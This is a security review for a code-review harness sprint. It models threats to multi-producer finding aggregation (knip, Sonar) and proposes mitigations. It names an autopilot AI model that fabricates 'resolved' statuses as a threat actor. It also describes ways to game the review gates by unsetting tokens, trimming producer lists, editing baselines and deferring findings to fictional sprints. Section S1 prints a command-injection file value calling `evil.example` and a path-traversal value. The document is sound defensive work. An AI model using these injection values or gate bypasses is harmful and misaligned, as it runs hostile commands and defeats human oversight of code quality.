# Security Review — harness-review-resolution-v1

> **Threat model.** Same actors as parent sprint `harness-audit-resolution-and-scope-v1`: (a) the AI model itself, under autopilot or token pressure, fabricating a "resolved" status without an actual fix; (b) a misconfigured operator who pastes a real secret into a rationale prompt or wipes a producer baseline to hide regressions; (c) a compromised ruflo daemon worker; (d) external producer outputs (knip stdout, sonar API response) — these are new in this sprint and require their own integrity controls. External network attackers remain out of scope; the harness is local-only.
>
> **What is new in this sprint.** Multi-producer aggregation introduces 6 new attack surfaces (S1–S6 below) on top of the parent sprint's 8 surfaces (which all remain load-bearing — see §Inherited surfaces). The new surfaces center on (a) trust boundaries around producer JSON output that the harness consumes as fact (knip is a third-party npm tool; sonar may be a third-party SaaS), (b) integrity of the cross-producer `har_id` namespace, (c) ways an operator can game the unified exit predicate by manipulating one producer while another silently masks the gap.
>
> **Carry-forward.** Parent's 8 surfaces (S1 encryption key, S2 rationale leakage, S3 audit-rerun env inheritance, S4 evidence-path traversal, S5 scope-bounded gate metadata, S6 plaintext-to-encrypted migration atomicity, S7 execFile + O_EXCL, S8 phase-workers.json enum injection) all remain in scope and are explicitly tabulated in §Inherited surfaces below.

---

## S1 — Knip `--json` output schema spoof

**Attack.** AC-4 adds `--json` producer mode to `scripts/sprint-deadcode-delete.mjs`, which shells out to `pnpm exec knip --reporter json`. The harness then parses the resulting `worker-output/knip.json` and writes typed entries into `state.review_findings[]`. Knip is an npm dependency — currently a single-author MIT package. If knip is compromised (supply-chain attack, malicious post-install script, typosquat in `pnpm-lock.yaml`), the JSON it emits is attacker-controlled.

Three concrete spoof variants:

1. **Severity inflation / deflation.** Compromised knip emits every finding as `severity: "low"`. The unified predicate counts them as open until decided; an operator skimming the walker may rubber-stamp Accept on all "low" entries. Real medium/high dead-code paths land in production.
2. **Path injection.** Knip emits `file: "../../../etc/passwd"` or `file: "$(curl evil.example/x)"`. If the harness ever interpolates that path into a shell command (e.g., `git log -p -- "$file"` in the walker's "show me context" helper), command execution or path traversal follows.
3. **Field-shape attack.** Knip emits `{ severity: { toString: "..." }, line: [42, 43] }`. Downstream jq or `JSON.parse` accepts the structure; `state.review_findings[]` now carries non-string severities that confuse the predicate's `select(.severity=="high")` and silently exclude findings.

**Likelihood.** Low for full supply-chain compromise; Medium for accidental schema drift between knip versions (knip's `--reporter json` format has changed between minor releases).

**Impact.** High for variant 1 (silent triage rubber-stamp); Medium for variants 2 + 3 (depends on downstream usage).

**Mitigation.**

1. **Schema-validate `worker-output/knip.json` with Zod or AJV before merging into state.** Required fields: `file: string`, `line: number | null`, `description: string`, optional `severity: "high"|"medium"|"low"` (default "low" if absent). Reject any entry that fails validation; emit a per-entry warning to stderr and exclude from `review_findings[]`.
2. **Path normalization on `file`.** All `file` values run through the closure L13 canonicalization helper (`realpath` + `..` reject) before being recorded. A `..`-containing file path means the producer is malicious or buggy; either way it does not belong in state.
3. **Pin knip version in `package.json`.** Use exact version (`"knip": "5.30.0"`, not `"^5.30.0"`) and `pnpm-lock.yaml` integrity hashes. Renovate or dependabot PRs to knip are reviewed manually with attention to the JSON output diff.
4. **Reproducibility check.** Producer schema validation MUST refuse to parse output if knip's stdout contains anything before the opening `[` or `{` (some npm tools print warnings to stdout). Banner / progress lines are stderr-only.

**Residual risk.** Low after fix. A determined supply-chain attacker who controls knip can still emit valid-schema findings — but the impact is bounded to dead-code findings, which are operator-reviewed in the resolution walk; the operator is the final integrity check.

---

## S2 — Sonar API response tampering (untrusted external producer)

**Attack.** AC-5 wires `scripts/sprint-sonar-parse.mjs` with a `--json` producer mode. The parser reads sonar scan results that, depending on the deployment, may come from a remote SonarCloud API or a self-hosted SonarQube instance. The network path is therefore in-scope for tampering: a malicious proxy, a compromised CI runner, or a DNS rebinding attack against `sonarcloud.io` can serve arbitrary JSON. Even with TLS, a stolen API token gives an attacker write access to the project's findings — they can mark real issues as "WONT_FIX" before the harness reads them.

Two concrete variants:

1. **Finding deletion.** Attacker calls SonarCloud's `/api/issues/do_transition` to mark a real "BLOCKER"-severity issue as `WONTFIX`. The harness's next `sprint-sonar-parse.mjs --json` fetches a sanitized view; that real finding never enters `review_findings[]`. Sprint ships with the issue invisible.
2. **Finding injection.** Attacker creates a fake LOW-severity finding pointing at `apps/api/src/auth.ts:1` with description "obfuscated credential — accept and move on". Operator walks the rationale prompt, types "looks fine, accept", and `review_findings[]` now carries a permanent decision against a fake finding — operator-attention budget wasted.

**Likelihood.** Low without an active attacker; Medium in a hostile network or CI environment.

**Impact.** High for variant 1 (real issue hidden); Low for variant 2 (operator-time DoS, but no data loss).

**Mitigation.**

1. **Capture sonar API response in `worker-output/sonar.raw.json` BEFORE parsing.** This commits the raw bytes the harness saw to git, so a future audit can detect tampering by diffing against the sonar server's audit log.
2. **Pin sonar server fingerprint.** Configure `node-fetch` with a CA-pinned agent for the sonar host; reject on cert mismatch. Document in `docs/sprints/SCRIPTS.md` how to rotate the pin.
3. **Require token via env, not file.** `SONAR_TOKEN` is read from process env only — never persisted to `worker-output/` or `state.json`. If `SONAR_TOKEN` is unset, the parser produces an empty `sonar.json` with `{ producer: "sonar", error: "no token configured" }` — predicate-friendly degradation.
4. **Surface sonar-disabled in dashboard.** When sonar runs in error mode, `state.review_findings[]` carries zero sonar entries but the dashboard banner MUST show "sonar: not configured" — preventing the false sense of "zero findings" coverage. (Closes S4 below.)

**Residual risk.** Medium. A compromised sonar server is genuinely outside this sprint's control; the captured-raw mitigation only enables detection post-facto. Documented limitation in AC-5's proof file.

---

## S3 — Cross-producer `har_id` collision exploitation

**Attack.** With per-producer ID prefixes (e.g., `audit:HAR-1`, `knip:HAR-1`, `sonar:HAR-1`) — the alternative ADR-004 explicitly rejected — an operator typing "Fix HAR-1" in the rationale could refer to any of three findings. A malicious or careless operator could exploit this: defer `audit:HAR-1` with rationale "Fixed in HAR-1 follow-up" — implying the audit finding was addressed, when the follow-up actually targets `knip:HAR-1`.

Even with the chosen global namespace (ADR-004), a related attack remains:

1. **Stale `har_id` reuse.** Sprint N closes with `HAR-1` deferred to sprint N+1, ac_id `AC-5`. Sprint N+1 starts; verifying phase assigns its own `HAR-1` (to a totally different finding) before the operator looks at the deferred one. Sprint N+1's `state.review_findings[0].har_id == "HAR-1"` collides with the deferred reference from sprint N.
2. **Operator confusion across sprints.** A linked GitHub issue created in sprint N pointing at "HAR-1 in sprint N" still says "HAR-1" — but if a reader is in sprint N+1's context, they look at the wrong finding.

**Likelihood.** Medium for variant 1 (sprint-to-sprint reuse is the design); High for variant 2 (operator confusion is inherent to non-unique IDs).

**Impact.** Medium. Bad triage decisions, lost track of deferred findings.

**Mitigation.**

1. **Within a sprint: `har_id` is unique across all producers** — guaranteed by sequential global assignment (ADR-004).
2. **Across sprints: deferred findings carry `(source_sprint, har_id)` as the cross-sprint key.** `state.review_findings[].deferred_to_sprint` is a string; the deferred-to sprint, when it starts, MUST link its `AC-N` to that pair, not to `HAR-1` alone. Concretely:

   ```json
   {
     "ac_id": "AC-5",
     "deferred_from": { "sprint": "harness-review-resolution-v1", "har_id": "HAR-3" }
   }
   ```

3. **Walker rejects `deferred_to_sprint == ""`.** Already enforced by predicate (parent ADR-2); reaffirmed here.
4. **`sprint-spec-lock` MUST detect deferred findings from prior sprints whose `deferred_to_sprint` equals the current slug and surface them in the AC list.** A finding deferred to sprint N+1 must show up in sprint N+1's `## Files touched` (in-scope) and AC list, or the deferral is silently dropped.

**Residual risk.** Low after fix.

---

## S4 — Producer-disabled bypass (operator silences one producer to skip findings)

**Attack.** The operator (or an autopilot model under deadline pressure) wants the review-resolution phase to advance with minimal walker time. They notice that sonar requires a token (S2 mitigation 3) and that knip can be configured to ignore directories. Two bypass paths:

1. **`SONAR_TOKEN` deliberately unset.** Operator does `unset SONAR_TOKEN` before running verifying. `sprint-sonar-parse.mjs` emits empty `sonar.json` with `error: "no token configured"`. Zero sonar findings reach `review_findings[]`. Walker is shorter; sprint advances.
2. **`knip.json` config carved to skip directories.** Operator edits `knip.json` config to add `"ignore": ["apps/web/src/components/**"]`. Knip emits zero findings for that whole tree. The directory could be exactly where the issue lives.
3. **`phase-manifest.json` `producers` list trimmed.** Operator deletes the `knip` or `sonar` entry from the manifest. Verifier never runs the producer. Zero findings; sprint advances.

**Likelihood.** Medium. Easy to do, easy to rationalize ("we don't have a sonar instance set up yet"), invisible in the predicate.

**Impact.** High. Whole producer's worth of findings silently absent.

**Mitigation.**

1. **Dashboard banner MUST show producer status per phase advance.** Same stacked bar as ADR-001 above, but with explicit per-producer status: `audit: 5 findings (5 decided), knip: 0 findings (1 producer ran), sonar: SKIPPED (no token)`. A skipped producer is impossible to hide.
2. **`spec.md §H` MUST declare which producers are expected to run.** A `producers_expected: ["audit", "knip", "sonar"]` field. Verifier compares actual producer outputs to expected list; missing producers FAIL the verifying gate.
3. **`producers_expected` declared at spec-lock, immutable through sprint.** Operator changing it mid-sprint creates a `state.gate_bypasses[]` entry with rationale (parent S11) — surfaces in retro.
4. **Sonar-not-configured is a one-time blessing.** If `SONAR_TOKEN` is unset at sprint start, the spec-lock gate prompts: "sonar producer is not configured; proceed without sonar coverage? Y/N + rationale". Rationale lands in `spec.md §J` permanently. No silent skip.

**Residual risk.** Low after fix. An operator who lies in the spec-lock prompt is the same threat as parent S11 (bypass-rationale fabrication); the PII-redactor + git-permanence chain handles it the same way.

---

## S5 — Baseline manipulation in `worker-output/{audit,knip,sonar}-baseline.json`

**Attack.** ADR-003 captures per-producer baseline JSON at review-resolution phase entry. The rerun script (`sprint-review-rerun.sh`) diffs post-fix producer output against the baseline. A malicious or careless edit to a baseline file makes regressions invisible: target HAR-N disappears not because the fix worked, but because the baseline was rewritten to claim HAR-N was never present.

Three concrete variants:

1. **Baseline deletion before rerun.** Operator does `rm worker-output/knip-baseline.json`. Rerun has nothing to diff against; falls back to "compare against empty" → every finding is now "new", target is "absent" by definition, PASS.
2. **Baseline tampering.** Operator opens `worker-output/audit-baseline.json` and removes the HAR-N entry. Rerun: HAR-N absent in both baseline and current → "fixed", PASS.
3. **Baseline regenerated at rerun-time.** A buggy rerun script regenerates the baseline as part of its setup. Now there is no historical record; every rerun is its own baseline. PASS by tautology.

**Likelihood.** Low for variant 1 (deletion is conspicuous); Medium for variant 2 (selective edit looks like legitimate cleanup); Low for variant 3 (would be caught in code review of the rerun script).

**Impact.** High. The fix-verification chain is broken; sprint ships with regressions invisible to the predicate.

**Mitigation.**

1. **Baselines are write-once.** `sprint-review-rerun.sh` MUST NOT write to `*-baseline.json`. Only the verifying-phase-entry transition writes baselines; any later modification is a pre-commit hook violation.
2. **Pre-commit hook check.** Mirror the existing `.husky/pre-commit` no-secrets grep: refuse any commit that modifies `worker-output/*-baseline.json` of an active sprint (state.json `phase != "done"`). Allow modifications only when sprint phase advances to `done`.
3. **Baseline SHA-256 captured in state.json.** At baseline creation, compute `sha256(audit-baseline.json)` etc. and persist in `state.review_baselines[].sha`. Rerun script verifies SHA before diffing. Mismatch → BLOCK with explicit message.
4. **Baseline existence required by predicate.** `review_resolution_complete` predicate requires `state.review_baselines` to contain one entry per expected producer (§S4); missing baseline → fail predicate.

**Residual risk.** Low after fix. SHA + write-once + pre-commit hook is defense in depth.

---

## S6 — Exit predicate gaming (deferral to non-existent sprint)

**Attack.** The predicate (parent ADR-2) requires `deferred_to_sprint != "" and ac_id != ""`. It does NOT require `deferred_to_sprint` to be a sprint that exists, will exist, or has the matching `ac_id`. Operator can game the predicate trivially:

1. **Fictional sprint slug.** Operator types `deferred_to_sprint: "harness-future-cleanup-v999"`, `ac_id: "AC-1"`. Predicate passes; the sprint never gets created; the deferred finding is in limbo forever.
2. **Typo / drift.** Operator types `deferred_to_sprint: "harnes-cleanup-v2"` (missing one 's'). Sprint `harness-cleanup-v2` later exists but the linkage is broken.
3. **Deferred AC never written.** Operator types `deferred_to_sprint: "harness-cleanup-v2"`, `ac_id: "AC-42"` — but when that sprint is created, AC-42 is about something else entirely. The deferred finding has a dangling pointer.

**Likelihood.** High. Predicate is satisfied by any non-empty string.

**Impact.** Medium. Findings vanish into the queue without escalation; technical debt accumulates invisibly.

**Mitigation.**

1. **Walker prompts with autocomplete.** `sprint-review-resolve.sh` Defer path lists existing future-sprint directories (`docs/sprints/*/state.json` with `phase != "done"` AND created_at > current sprint). Operator picks from list; free-form entry requires explicit `--allow-new-sprint` flag + rationale.
2. **Cross-sprint linkage report.** New script `scripts/sprint-deferral-audit.sh` runs at every spec-lock and surfaces all `(deferred_to_sprint, ac_id)` references from CLOSED sprints that point at the current sprint but have no matching AC. Output is mandatory reading at spec-lock.
3. **Dashboard surfaces deferral graph.** Same dashboard.html as parent ADR-1: render edges from sprint N's deferrals to sprint M's ACs. Dangling references render in red.
4. **AC text must mention deferred-from har_id.** When a sprint creates an AC to address a prior-sprint deferral, the AC description MUST contain `(addresses harness-review-resolution-v1#HAR-3)` — enforced by spec-lock regex.

**Residual risk.** Medium. An operator determined to game the system can still defer to a real future sprint and bury the AC under a vague label. The dashboard surfacing is the social control; technical control alone cannot fully solve this.

---

## Inherited surfaces from prior sprint

All 8 surfaces from `harness-audit-resolution-and-scope-v1/security-review.md` remain in scope. Load-bearing status for this sprint:

| Inherited surface                                | Still load-bearing? | Reason                                                                                                                                                                     |
| ------------------------------------------------ | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Parent S1 (encryption key file)                  | Yes                 | No change in this sprint; key file still gates memory.json/session.json.                                                                                                   |
| Parent S2 (operator rationale leakage to git)    | **Yes, extended**   | This sprint's walker writes rationale for 3 producers instead of 1; `sprint-pii-redact.sh` MUST wrap every producer's Defer/Accept rationale.                              |
| Parent S3 (audit-rerun env inheritance)          | **Yes, extended**   | Each of the 3 producers' rerun path is a new caller of `worker-trigger.sh` (audit) or a Node subprocess (knip, sonar); each MUST use `env -i HOME PATH SHELL …` allowlist. |
| Parent S4 (evidence-path traversal at new sites) | **Yes, extended**   | `record_sub_step` calls from new walker code, new rerun code, new producer-parse code — all 3 sites need closure L13 canonicalization.                                     |
| Parent S5 (scope-bounded gate metadata)          | Yes                 | Unchanged; scope-bounded gate still applies to audit producer; knip and sonar are scope-bounded at producer-config level, not gate level.                                  |
| Parent S6 (plaintext-to-encrypted migration)     | Yes                 | Unchanged; no encryption changes in this sprint.                                                                                                                           |
| Parent S7 (execFile + O_EXCL)                    | Yes                 | Unchanged; new producer scripts MUST use the same patterns when shelling out (knip via `pnpm exec`, sonar via `node-fetch`).                                               |
| Parent S8 (phase-workers.json enum injection)    | **Yes, extended**   | Producer field becomes part of the manifest schema; same enum-injection class — validate `producer ∈ {audit, knip, sonar}` at load.                                        |

---

## Required for this sprint to be ship-ready

1. **S1 proof.** `worker-output/knip.json` passes Zod schema validation before merging to state; pinned knip version in `package.json`; test fixture with a malformed knip output is rejected with no state mutation.
2. **S2 proof.** `worker-output/sonar.raw.json` is captured before parsing; sonar-not-configured surfaces as a spec-lock blessing requiring rationale; smoke test with `SONAR_TOKEN=""` produces a banner warning and a predicate-friendly empty result.
3. **S3 proof.** Cross-sprint deferral linkage report fires at every spec-lock; fixture with a dangling `(deferred_to_sprint, ac_id)` reference is reported as red on the dashboard.
4. **S4 proof.** `producers_expected` declared in `spec.md §H`; verifying gate fails when actual producers run is a strict subset; sonar-skip requires `spec.md §J` rationale entry.
5. **S5 proof.** Pre-commit hook refuses modifications to `worker-output/*-baseline.json` while sprint phase is active; SHA-256 captured in state; rerun script verifies SHA before diff.
6. **S6 proof.** Walker autocompletes from existing sprint directories; deferral audit script surfaces dangling references at every spec-lock; dashboard renders deferral graph with red edges for dangling.

Without S1, S2, S4, and S6 proofs concrete and tested, this sprint reproduces exactly the audit-bypass pattern across three producers instead of one — the failure mode the parent sprint was designed to eliminate.

---

## Verdict

**APPROVED WITH CONDITIONS.**

The six new surfaces are all mitigable within the 7 ACs in scope. Four are catastrophic-if-missed and elevated to ship-blocking:

- **S1 (knip schema spoof)** — must-fix in AC-4. Without Zod validation, a single bad knip release corrupts state with no detection.
- **S2 (sonar API tampering)** — must-fix in AC-5. Raw-response capture + sonar-disabled blessing is the floor; without these, sonar-coverage gaps are invisible.
- **S4 (producer-disabled bypass)** — must-fix in AC-1 / AC-2. `producers_expected` declaration is the only structural defense; without it, the verify gate falls back to "whatever ran is what's expected", which silently accepts any skip.
- **S6 (predicate gaming via fictional deferred sprint)** — must-fix in AC-3. The walker autocomplete + deferral-audit script is the only way to prevent findings from vanishing into a queue of one.

**Conditions** (each tied to specific ACs; failure to deliver any condition downgrades the verdict to **NEEDS REWORK** at sprint close):

1. **AC-4:** S1 mitigation shipped — Zod schema validation of `worker-output/knip.json`; pinned knip version; malformed-knip rejection fixture test.
2. **AC-5:** S2 mitigation shipped — sonar raw response captured; `SONAR_TOKEN` unset is a spec-lock blessing; empty-result smoke passes predicate gracefully.
3. **AC-1 / AC-2:** S4 mitigation shipped — `producers_expected` field in spec.md; verifying gate enforces; sonar-skip requires §J rationale.
4. **AC-3:** S6 mitigation shipped — walker autocomplete from existing sprint dirs; `sprint-deferral-audit.sh` fires at spec-lock; dashboard renders dangling-reference graph.

**Out of scope (acknowledged):**

- Hardware-attestation of producer binaries (TPM-backed signature of knip / sonar releases) — too heavy for v0.7.3.
- Network-attacker threat model on sonar API — partially addressed by raw-response capture; full mitigation would require independent audit log mirroring.
- Operator-rushing on deferral autocomplete (operator picks any sprint to satisfy autocomplete) — social control via dashboard surfacing.

**Note for the reviewer.** This review was produced after reading: spec.md (full), parent sprint architect-review.md and security-review.md (full), `scripts/sprint-audit-resolve.sh` (full), `scripts/sprint-deadcode-delete.mjs` (full), `scripts/sprint-sonar-parse.mjs` (full), and `scripts/lib/phase-manifest.json` (full). The parent sprint's closure-pattern failure mode (audit bypass) is the direct precedent; this review extends the same defense-in-depth posture across three producers, treating each producer's output as untrusted-until-proven-validated.
